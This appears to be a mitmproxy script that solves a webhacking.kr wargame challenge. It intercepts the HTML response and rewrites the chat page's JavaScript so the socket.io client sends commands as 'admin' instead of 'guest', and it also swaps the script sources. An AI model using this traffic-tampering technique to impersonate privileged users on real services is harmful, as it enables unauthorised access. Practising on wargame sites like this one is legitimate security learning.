from mitmproxy import http

def response(flow: http.HTTPFlow) -> None:
    if "webhacking.kr" in flow.request.url:
        # HTML 응답에서 JavaScript 수정
        if flow.response.headers.get("Content-Type", "").startswith("text/html"):
            with open('./socket.io-2.2.0.slim.js', "r", encoding="utf-8") as f:
                content = f.read()

            # HTML 내용 가져오기
            html = flow.response.text

            # JavaScript 수정
            modified_html = html.replace("""    $(function () {
      var username = "guest";
      var socket = io();
      $('form').submit(function(e){
        e.preventDefault();
        socket.emit('cmd',username+":"+$('#m').val());
        $('#m').val('');
        return false;
      });
      socket.on('cmd', function(msg){
        $('#messages').append($('<li>').text(msg));
      });
    });""", """$(function () {
    var username = "admin";
    var socket = io();
    $('form').submit(function(e){
        e.preventDefault();
        socket.emit('cmd',username+":"+$('#m').val());
        $('#m').val('');
        return false;
    });
    socket.on('cmd', function(msg){
        $('#messages').append($('<li>').text(msg));
    });
});""")
            modified_html = modified_html.replace('<script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/2.2.0/socket.io.js"></script>', "<script>" + content + "</script>")
            modified_html = modified_html.replace("https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js", "http://code.jquery.com/jquery-3.4.1.js")

            flow.response.text = modified_html